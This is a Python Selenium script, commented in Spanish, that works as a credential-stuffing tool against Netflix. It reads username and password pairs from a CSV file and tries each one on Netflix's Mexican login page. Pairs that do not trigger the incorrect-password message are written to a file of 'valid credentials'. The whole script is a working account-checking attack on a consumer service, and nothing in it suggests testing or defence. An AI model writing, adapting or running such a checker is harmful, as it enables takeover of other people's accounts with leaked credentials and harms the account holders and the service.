import os.path
import csv
from selenium import webdriver
import time
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException, WebDriverException

def iniciar_sesion(usuario, contrasena, credenciales_validas):
    try:
        driver = webdriver.Chrome()
        driver.maximize_window()

        driver.get('https://www.netflix.com/mx/login')

        time.sleep(5)
        username_field = driver.find_element(By.NAME, 'userLoginId')
        username_field.send_keys(usuario)

        password_field = driver.find_element(By.NAME, 'password')
        password_field.send_keys(contrasena)

        submit = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[3]/div/div/div[1]/form/button')
        submit.click()
        time.sleep(10)
        
        # Busca el mensaje de error en el contenido de la página
        page_content = driver.page_source
        if "Contraseña incorrecta." not in page_content:
            print(f"Las credenciales {usuario}, {contrasena} funcionan correctamente")
            credenciales_validas.append((usuario, contrasena))
    except NoSuchElementException:
        print(f"Las credenciales {usuario}, {contrasena} no funcionan... Intentando con el siguiente conjunto.")
    except WebDriverException as e:
        print(f"Hubo un problema al intentar iniciar sesión con {usuario}, {contrasena}: {str(e)}")
    except Exception as e:
        # Imprime el mensaje de error específico si lo hay
        print(str(e))
    finally:
        # Cerrar el navegador en cualquier caso
        driver.quit()

# Lee las credenciales desde el archivo CSV
csv_file_path = 'csv/data_netflix.csv'
credenciales_validas = []

if os.path.isfile(csv_file_path):
    with open(csv_file_path, 'r') as csv_file:
        csv_reader = csv.reader(csv_file)

        for line in csv_reader:
            usuario = line[0]
            contrasena = line[1]

            iniciar_sesion(usuario, contrasena, credenciales_validas)

# Guarda las credenciales válidas en un archivo .txt
if credenciales_validas:
    with open('results/credenciales_validas_netflix.txt', 'w') as txt_file:
        for credencial in credenciales_validas:
            txt_file.write(f"{credencial[0]},{credencial[1]}\n")

print("Credenciales validas guardadas en 'results/credenciales_validas_netflix.txt'")
